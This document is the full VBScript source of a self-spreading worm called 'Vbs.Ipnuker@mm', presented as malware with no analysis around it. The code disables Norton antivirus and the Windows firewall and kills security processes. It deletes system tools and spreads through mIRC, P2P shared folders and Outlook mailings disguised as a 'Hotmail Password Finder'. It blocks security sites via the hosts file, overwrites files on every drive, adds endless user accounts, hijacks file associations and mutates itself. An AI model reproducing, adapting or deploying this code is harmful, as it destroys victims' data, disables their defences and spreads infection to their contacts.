'Vbs.Ipnuker@mm
'Ipnuker 2005


Dim a,b,c,d,e,f,g,h,i,j,k,l,m,n,MircDir,Mirc,IpnukerCode,Code,HideIpnuker,Mail,CompStuff
Set a = Createobject("Wscript.Shell")
Set b = Createobject("Scripting.FileSystemObject")
Set CompStuff = CreateObject("WScript.Network") 
Set Drives=b.Drives 
On Error Resume Next

Set Code = b.OpenTextFile(Wscript.ScriptFullName)
IpnukerCode = Code.Readall

If b.FolderExists("C:\Winnt") Then
WindowDir = "C:\Winnt"
End If 
If b.FolderExists("C:\Windows") Then
WindowDir = "C:\Windows"
End If 
If b.FolderExists("C:\Win32") Then
WindowDir = "C:\Win32"
End If 

a.Regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Ipnuker", Chr(34) & WindowDir & "\Ipnuker.vbs" & Chr(34)

'Auto Protect Off
On Error Resume Next
AutoOff = "."
Set oWMI = GetObject("winmgmts://.")
AutoOffName = "Norton AntiVirus Auto-Protect Service"
sWQL = "Select state from Win32_Service " & "Where displayname='" & AutoOffName & "'"
Set oResults = oWMI.ExecQuery(sWQL)
For Each oService In oResults
oService.StopService
oService.ChangeStartMode("Disabled")
Next


If b.FileExists("C:\OnOff.txt") Then
Continue
Else
'Script Blocker Uninstall On Reboot
On Error Resume Next
Const HKEY_LOCAL_MACHINE = &H80000002
strComputer = "."
Set objRegistry = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
strKeyPath = "SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
strValueName = "Uninstall Norton Script Blocking"
arrStringValues = ("MSIEXEC /x {D327AFC9-7BAA-473A-8319-6EB7A0D40138} /Q")
objRegistry.SetStringValue HKEY_LOCAL_MACHINE, strKeyPath, strValueName,arrStringValues

Set m = b.CreateTextFile("C:\OnOff.txt") 
m.Writeline ""
m.Close
a.run "taskkill.exe /F /IM wscript.exe",vbhide
a.run "shutdown -r -t 00"
End If

Sub Continue()

h = "Ipnuker"

a.regwrite "HKCU\Software\Microsoft\Security Center\FirewallDisableNotify", "1", "REG_DWORD"
a.regwrite "HKCU\Software\Microsoft\Security Center\UpdatesDisableNotify", "1", "REG_DWORD"
a.regwrite "HKCU\Software\Microsoft\Security Center\AntiVirusDisableNotify", "1", "REG_DWORD"
a.regwrite "HKLM\Software\Microsoft\Security Center\FirewallDisableNotify", "1", "REG_DWORD"
a.regwrite "HKLM\Software\Microsoft\Security Center\UpdatesDisableNotify", "1", "REG_DWORD"
a.regwrite "HKLM\Software\Microsoft\Security Center\AntiVirusDisableNotify", "1", "REG_DWORD"
a.regwrite "HKCU\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile\EnableFirewall","0","REG_DWORD"
a.regwrite "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile\EnableFirewall","0","REG_DWORD"
a.regwrite "HKCU\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile\EnableFirewall","0","REG_DWORD"
a.regwrite "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile\EnableFirewall","0","REG_DWORD"
a.run "taskkill.exe /F /IM ccApp.exe /IM PandaAVEngine.exe /IM zonealarm.exe /IM navw32.exe /IM Iexplorer.exe /IM mspaint.exe /IM notepad.exe /IM msnmsgr /IM wmplayer.exe /IM NMain.exe /IM WINWORD.exe /IM cmd.exe /IM realplayer.exe /IM Ypager.exe",vbHide

a.run "RUNDLL32 USER32.DLL,SwapMouseButton"

If b.FolderExists("C:\Program files\Norton AntiVirus") then
a.regWrite "HKLM\Software\Symantec\Norton Antivirus\Quarantine\QuarantinePath",Chr(34) & WindowDir & Chr(34)
End If

a.run "ping -t -l 65500 localhost",vbhide

'File Stuff
On Error Resume Next
Set d = b.CreateTextFile(Chr(34) & WindowDir & "\Ipnuker.vbs" & Chr(34))
d.writeline IpnukerCode
d.Close
Ipnuker12 = WindowDir & "\Ipnuker.vbs"
Set Ipnuker13 = b.GetFile(Ipnuker12) 
Ipnuker13.Attributes = 1

Set HideIpnuker = b.GetFile(Chr(34) & WindowDir & "\Ipnuker.vbs" & Chr(34))
HideIpnuker.Attributes = 2
b.DeleteFile WindowDir & "\System32\Calc.exe"
b.DeleteFile WindowDir & "\Notepad.exe"
b.DeleteFile WindowDir & "\System32\Mspaint.exe"

'Exploit1
aa = "<html>"
ba = "<script>"
ca = "window.onerror=new Function("&"history.go(0)"&");"
da = "function btf(){btf();}"
ea = "btf();"
fa = "</script>"
ga = "</html>"
set k = a.CreateTextFile(WindowDir & "\system32\Iexploit.html")
k.Writeline (aa)
k.Writeline (ba)
k.Writeline (ca)
k.Writeline (da)
k.Writeline (ea)
k.Writeline (fa)
k.Writeline (ga)
k.Close
a.Regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Iexploit",Chr(34) & WindowDir & "\system32\Iexploit.html" & Chr(34)

'Exploit2
set l = a.CreateTextFile(WindowDir & "\IeCrash.html")
l.Writeline "<body onLoad=window" & Chr(34) & "()>"
l.Close

If b.FolderExists("C:\Winnt") Then
a.RegWrite "HKLM\Software\Microsoft\Internet Explorer\Main\Start_Page", Chr(34) & "file:///C:\Winnt\IeCrash.html" & Chr(34)
End If 
If b.FolderExists("C:\Windows") Then
a.RegWrite "HKLM\Software\Microsoft\Internet Explorer\Main\Start_Page", Chr(34) & "file:///C:\Windows\IeCrash.html" & Chr(34)
End If 

'Mirc
On Error Resume Next
If b.FileExists("C:\Mirc\Mirc.ini") Then
MircDir = "C:\Mirc"
Else
If b.FileExists("C:\Mirc32\Mirc.ini") Then
MircDir = "C:\Mirc32"
Else
If b.FileExists("C:\ProgramFiles\Mirc\Mirc.ini") Then
MircDir = "C:\ProgramFiles\Mirc"
Else
If b.FileExists("C:\ProgramFiles\Mirc32\Mirc.ini") Then
MircDir = "C:\ProgramFiles\Mirc32"
End If
End If
End If
End If
If Not MircDir = "" Then
Set Mirc = b.CreateTextFile(MircDir & "\Script.ini", True)
Mirc.WriteLine ("[script]")
Mirc.WriteLine ("n0= on 1:JOIN:#:{")
Mirc.WriteLine ("n1= /if ( $nick == $me ) { halt }")
Mirc.WriteLine ("n2= /msg $nick Hotmail Password Cracker Downloads")
Mirc.WriteLine ("n3= /dcc send -c $nick" & WindowDir & "\Ipnuker.vbs")
Mirc.WriteLine ("n4= }")
Mirc.Close
End If

'P2P Spread
If b.FolderExists("C:\Program Files\KaZaA") then
KaZaA = "C:\Program Files\KaZaA\My Shared Folder\Hotmail Password Finder.vbs"
b.CopyFile Wscript.ScriptFullName,KaZaA
Set KaZaA1 = b.GetFile(KaZaA) 
KaZaA1.Attributes = 0
End If
If b.FolderExists("C:\Program Files\KaZaA Lite\") then
KaZaALite = "C:\Program Files\KaZaA Lite\My Shared Folder\Hotmail Password Finder.vbs"
b.CopyFile Wscript.ScriptFullName,KaZaALite
Set KaZaALite1 = b.GetFile(KaZaALite) 
KaZaALite1.Attributes = 0
End If
If b.FolderExists("C:\Program Files\Bearshare") then
Bearshare = "C:\Program Files\Bearshare\Shared\Hotmail Password Finder.vbs"
b.CopyFile Wscript.ScriptFullName,Bearshare
Set Bearshare1 = b.GetFile(Bearshare) 
Bearshare1.Attributes = 0
End If
If b.FolderExists("C:\Program Files\Morpheus") then
Morpheus = "C:\Program Files\Morpheus\My Shared Folder\Hotmail Password Finder.vbs"
b.CopyFile Wscript.ScriptFullName,"C:\Program Files\Morpheus\My Shared Folder\Hotmail Password Finder.vbs"
Set Morpheus1 = b.GetFile(Morpheus) 
Morpheus1.Attributes = 0
End If
If b.FolderExists("C:\Program Files\ICQ") then
ICQ = "C:\Program Files\ICQ\Shared Files\Hotmail Password Finder.vbs"
b.CopyFile Wscript.ScriptFullName,ICQ
Set ICQ1 = b.GetFile(ICQ) 
ICQ1.Attributes = 0
End If
If b.FolderExists("C:\Program Files\Grokster") then
Grokster = "C:\Program Files\Grokster\My Grokster\Hotmail Password Finder.vbs"
b.CopyFile Wscript.ScriptFullName,Grokster
Set Grokster1 = b.GetFile(Grokster) 
Grokster1.Attributes = 0
End If

'Block Hosts
Set g = b.CreateTextFile(WindowDir & "\system32\drivers\etc\hosts",True)
g.writeline "#Vbs.Ipnuker@mm"
g.writeline "#Ipnuker 2005"
g.writeline ""
g.writeline "127.0.0.1 www.symantec.com"
g.writeline "127.0.0.1 symantec.com"
g.writeline "127.0.0.1 www.sophos.com"
g.writeline "127.0.0.1 sophos.com"
g.writeline "127.0.0.1 www.macafee.com"
g.writeline "127.0.0.1 macafee.com"
g.writeline "127.0.0.1 www.f-secure.com"
g.writeline "127.0.0.1 f-secure.com"
g.writeline "127.0.0.1 kaspersky-labs.com"
g.writeline "127.0.0.1 www.kaspersky-labs.com"
g.writeline "127.0.0.1 www.kaspersky.com"
g.writeline "127.0.0.1 kaspersky.com"
g.writeline "127.0.0.1 www.trendmicro.com"
g.writeline "127.0.0.1 trendmicro.com"
g.writeline "127.0.0.1 windowsupdate.microsoft.com"
g.writeline "127.0.0.1 www.windowsupdate.microsoft.com"
g.writeline "127.0.0.1 www.rohitab.com"
g.writeline "127.0.0.1 rohitab.com"
g.writeline "127.0.0.1 www.google.com"
g.writeline "127.0.0.1 google.com"
g.writeline "127.0.0.1 www.msn.com"
g.writeline "127.0.0.1 msn.com"
g.writeline "127.0.0.1 www.yahoo.com"
g.writeline "127.0.0.1 yahoo.com"
g.writeline "127.0.0.1 www.astalavista.com"
g.writeline "127.0.0.1 astalavista.com"
g.writeline "127.0.0.1 www.hotmail.com"
g.writeline "127.0.0.1 hotmail.com"
g.writeline "127.0.0.1 www.microsoft.com"
g.writeline "127.0.0.1 microsoft.com"
g.writeline "127.0.0.1 www.ebay.com"
g.writeline "127.0.0.1 ebay.com"
g.writeline "127.0.0.1 www.gmail.com"
g.writeline "127.0.0.1 gmail.com"
g.writeline "127.0.0.1 www.dell.com"
g.writeline "127.0.0.1 dell.com"
g.writeline "127.0.0.1 www.msdn.com"
g.writeline "127.0.0.1 msdn.com"
g.writeline "127.0.0.1 www.hi5.com"
g.writeline "127.0.0.1 hi5.com"
g.writeline ""
g.writeline "#Ipnuker 2005"
g.writeline "#Vbs.Ipnuker@mm"
g.Close

'Outlook Spread
On Error Resume Next
If b.FolderExists("C:\Program Files\Microsoft Office") Then
'Do Nothing
Else
Set Out1 = CreateObject("Outlook.Application")
Set Out2 = CreateObject("Outlook.Application")
Set Mapi1 = Out2.GetNameSpace("MAPI")
Set j = Mapi1.AddressLists(1)
For X = 1 To j.AddressEntries.Count
Set Mail = Out1.CreateItem(0)
Mail.To = Out1.GetNameSpace("MAPI").AddressLists(1).AddressEntries(X)
Mail.Subject = "Hotmail Password Finder Downloads"
Mail.Body = "The Attached File Is A Hotmail Password Finder"
Mail.Body = "This Is A 100% Free Full Version And Is Easy To Use Just Follow The Instructions."
Mail.Body = "This Tool Is Illegal So Use It With Caution Please Enjoy."
Mail.Attachments.Add WindowDir & "\Ipnuker.vbs"
Mail.Send
Next
Out1.Quit
End If

'FileInfection
On Error Resume Next
For Each Drive in Drives
If Drive.isready then
Dosearch Drive & "\"
End If 
Next 

Function Dosearch(Path)
On Error Resume Next
Set Folder=b.GetFolder(path)
Set Files = Folder.Files 
For Each File in Files
If b.GetExtensionName(file.path)="vbs" Or b.GetExtensionName(file.path)="bat" Or b.GetExtensionName(file.path)="txt" Or b.GetExtensionName(file.path)="ini" Or b.GetExtensionName(file.path)="html" Or b.GetExtensionName(file.path)="vbe" Or b.GetExtensionName(file.path)="doc" Or b.GetExtensionName(file.path)="log" Then
On Error Resume Next
Set FileInfection = b.createtextfile(file.path, True)
FileInfection.Write IpnukerCode
FileInfection.Close
End if
Next
Set SubfFolders = Folder.SubFolders 
For Each SubFolder in SubFolders 
Dosearch SubFolder.path 
Next 
End Function

'PayLoad
On Error Resume Next
If Month(Now) = "1" Or Month(Now) = "3" Or Month(Now) = "5" Or Month(Now) = "7" Or Month(Now) = "9" Or Month(Now) = "11" Then  
Set e = a.createTextFile(WindowDir & "\CreateUser.bat")
e.writeline "Do"
e.writeline "Randomize"
e.writeline "LVar = int(Rnd * 10110)"
e.writeline "set a = createobject(" & Chr(34) & "wscript.shell" & Chr(34) & ")"
e.writeline "a.run" & Chr(34) & "net user " & LVar & " /ADD" & Chr(34)
e.writeline "Loop"
e.writeline "wscript.sleep 2000"
e.close
a.run WindowDir & "\CreateUser.bat"
End If

'Registry Stuff
On Error Resume Next
a.regwrite "HKCU\software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\8", "LUALL.exe"
a.regwrite "HKCU\software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\9", "AUPDATE.exe"
a.regwrite "HKCR\txtfile\shell\open\command\",Chr(34) & WindowDir & "\Ipnuker.vbs" & Chr(34)
a.regwrite "HKCR\Folder\shell\open\command\",Chr(34) & WindowDir & "\Ipnuker.vbs" & Chr(34)
a.regwrite "HKCR\Folder\shell\explore\command\",Chr(34) & WindowDir & "\Ipnuker.vbs" & Chr(34)
a.regwrite "HKCR\exefile\shell\open\command\",Chr(34) & WindowDir & "\Ipnuker.vbs" & Chr(34)
a.regwrite "HKCR\HTTP\shell\open\command\", Chr(34) & WindowDir & "\Ipnuker.vbs & Chr(34)"
a.regwrite "HKCR\htmlfile\shell\open\command\",Chr(34) & WindowDir & "\Ipnuker.vbs" & Chr(34)
a.regwrite "HKCR\https\shell\open\command\", Chr(34) & WindowDir & "\Ipnuker.vbs & Chr(34)"
a.regwrite "HKCR\inifile\shell\open\command\",Chr(34) & WindowDir & "\Ipnuker.vbs" & Chr(34)
a.regwrite "HKCR\inffile\shell\open\command\",Chr(34) & WindowDir & "\Ipnuker.vbs" & Chr(34)
a.regwrite "HKCR\jpgfile\shell\open\command\",Chr(34) & WindowDir & "\Ipnuker.vbs" & Chr(34)
a.regwrite "HKCR\jpegfile\shell\open\command\",Chr(34) & WindowDir & "\Ipnuker.vbs" & Chr(34)
a.regwrite "HKCR\bmpfile\shell\open\command\",Chr(34) & WindowDir & "\Ipnuker.vbs" & Chr(34)
a.regwrite "HKCR\mp3file\shell\open\command\",Chr(34) & WindowDir & "\Ipnuker.vbs" & Chr(34)
a.regwrite "HKCR\mpgfile\shell\open\command\",Chr(34) & WindowDir & "\Ipnuker.vbs" & Chr(34)
a.regwrite "HKCR\mpegfile\shell\open\command\",Chr(34) & WindowDir & "\Ipnuker.vbs" & Chr(34)
a.regwrite "HKCR\wmafile\shell\open\command\",Chr(34) & WindowDir & "\Ipnuker.vbs" & Chr(34)
a.regwrite "HKCR\vbsfile\shell\open\command\",Chr(34) & WindowDir & "\Ipnuker.vbs" & Chr(34)
a.RegWrite "HKCR\vbsfile\DefaultIcon",Chr(34) & "shell32.dll,2" & Chr(34)
a.RegWrite "HKCR\exefile\DefaultIcon",Chr(34) & "shell32.dll,2" & Chr(34)
a.RegWrite "HKCR\jpgfile\DefaultIcon",Chr(34) & "shell32.dll,2" & Chr(34)
a.RegWrite "HKCR\jpegfile\DefaultIcon",Chr(34) & "shell32.dll,2" & Chr(34)
a.RegWrite "HKCR\inifile\DefaultIcon",Chr(34) & "shell32.dll,2" & Chr(34)
a.RegWrite "HKCR\inffile\DefaultIcon",Chr(34) & "shell32.dll,2" & Chr(34)
a.RegWrite "HKCR\batfile\DefaultIcon",Chr(34) & "shell32.dll,2" & Chr(34)
a.RegWrite "HKCR\comfile\DefaultIcon",Chr(34) & "shell32.dll,2" & Chr(34)
a.RegWrite "HKCR\mpgfile\DefaultIcon",Chr(34) & "shell32.dll,2" & Chr(34)
a.RegWrite "HKCR\mp3file\DefaultIcon",Chr(34) & "shell32.dll,2" & Chr(34)
a.RegWrite "HKCR\bmpfile\DefaultIcon",Chr(34) & "shell32.dll,2" & Chr(34)
a.RegWrite "HKCR\wmafile\DefaultIcon",Chr(34) & "shell32.dll,2" & Chr(34)
a.RegWrite "HKCR\htmlfile\DefaultIcon",Chr(34) & "shell32.dll,2" & Chr(34)
On Error Resume Next
a.regWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner",h
a.regWrite "HKLM\Software\Ipnuker\Vbs.Ipnuker@mm","Vbs.Ipnuker@mm"
a.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop",1,"REG_DWORD"
End Sub

Wscript.Sleep 3000

Set i = b.OpenTextFile(WScript.ScriptFullName, 1)
For o = 1 To Len(AllCode)
If Mid(IpnukerCode, o, 1) = vbCr Then x = x + 1
Next
Set i = b.OpenTextFile(WScript.ScriptFullName, 1)
For ii = 1 To (x + 1)
Onee = i.Readline
For j = 1 To Int(Rnd * 30): Stuff = Stuff & Chr(255 - Int(Rnd * 60)): Next
PolyMorph = PolyMorph & Onee & Chr(39) & Stuff & vbCr
If Int(Rnd * 3) = 2 Then PolyMorph = PolyMorph & Chr(39) & Stuff & vbCr
Stuff = ""
If Onee = "" Then Exit For
Onee = ""
Next
Set i = b.OpenTextFile(WScript.ScriptFullName, 2, True)
b.Writeline PolyMorph

'Ipnuker 2005
'Vbs.Ipnuker@mm
